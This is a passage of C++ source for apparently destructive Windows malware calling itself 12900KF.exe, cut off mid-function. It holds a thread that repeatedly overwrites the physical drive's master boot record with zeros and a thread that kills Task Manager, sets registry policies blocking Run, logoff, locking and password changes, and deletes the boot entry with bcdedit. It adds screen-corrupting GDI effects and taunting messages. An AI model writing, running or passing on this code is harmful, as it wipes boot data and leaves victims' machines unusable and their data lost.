0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}

DWORD WINAPI Disabler(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}

DWORD WINAPI shader1(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)(x & y) * i;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI shader2(LPVOID lpParam) {
    HDC hdc;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0); 
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 30; i++) {
            StretchBlt(hdcMem, rand() % 10, rand() % 10, sw - 20, sh - 20, hdcMem, 0, 0, sw, sh, SRCCOPY);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
        ReleaseDC(0, hdc);
        DeleteObject(screenshot); 
        DeleteDC(hdcMem); 
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader4(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = 239 + i;
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

DWORD WINAPI thing5(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        int inc3 = rand() % 700;
        int v = rand() % 2;
        if (v == 1) inc3 = -700;
        inc3++;
        pt[0].x = rect.left - inc3;
        pt[0].y = rect.top + inc3;
        pt[1].x = rect.right - inc3;
        pt[1].y = rect.top - inc3;
        pt[2].x = rect.left + inc3;
        pt[2].y = rect.bottom - inc3;
        PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);
        DeleteObject(hdcMem); DeleteObject(bm);
        Sleep(1);
    }
}

DWORD WINAPI cubes(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        StretchBlt(hdc, -10, -10, x + 20, y + 20, hdc, 0, 0, x, y, SRCCOPY);
        StretchBlt(hdc, 10, 10, x - 20, y - 20, hdc, 0, 0, x, y, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Verity(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += x;
			rgbScreen[i].g += y;
			rgbScreen[i].b += x;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI textouts(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "R.I.P YOUR COMPUTER!";
		text1 = "SYSTEM DESTROYED!";
		text2 = "THIS IS THE END OF YOUR PC!";
		text3 = "YOUR DATA WILL BE LOST!";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_EXTRALIGHT, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Engravers MT");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI textouts1(LPVOID lpvd)
{
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text = 0;
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    while(1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        text = "12900KF.exe";
        text1 = "R.I.P TO THE PERSON IN FRONT OF THE SCREEN!";
        text2 = "WHAT WERE YOU THINK?!"; // credits to N17Pro3426 for this text
        text3 = "ARE YOU STUPID?!";
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        DeleteObject(font);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader5(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(bmi.bmiHeader);
	bmi.bmiHeader.biWidth = sw;
	bmi.bmiHeader.biHeight = sh;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	RGBTRIPLE* rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed = x & y;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, +25, SRCCOPY);
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, -sh+25, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr);
	}
}

DWORD WINAPI Verityy(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    RGBQUAD* rgbScreen = NULL;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0, 0);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgbRed *= rand();
            rgbScreen[i].rgbGreen *= rand();
            rgbScreen[i].rgbBlue *= rand();
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(10);
        ReleaseDC(NULL, hdcScreen); 
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI pacmans(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI Geometrydashh(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)(x - y) * i;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI dwnm(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, nullptr, 0);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = x & y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI i912900(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt((double)(x + y)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI jhjhh(LPVOID lpParam) {
    DWORD startTime = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    srand((unsigned int)time(NULL));
    while (1) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - startTime) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            INT x = i % w, y = i / w;
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) += x ^ y;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI dfgvfh(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i) ^ (y * i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

DWORD WINAPI textouts2(LPVOID lpvd) {
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    const char* messages[] = {
        "12900KF.exe",
        "GOODBYE THIS USER!",
        "12900KF.EXE HAS BEEN DESTROYED YOUR DUMB PC!",
        "12900KF!",
        "R.I.P THIS WINDOWS USER!",
        "THE CREATOR WON'T BE RESPONSIBLE FOR ANY OF THE DAMAGE CAUSED!",
    };
    
    while (1) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        for (int i = 0; i < 6; i++) {
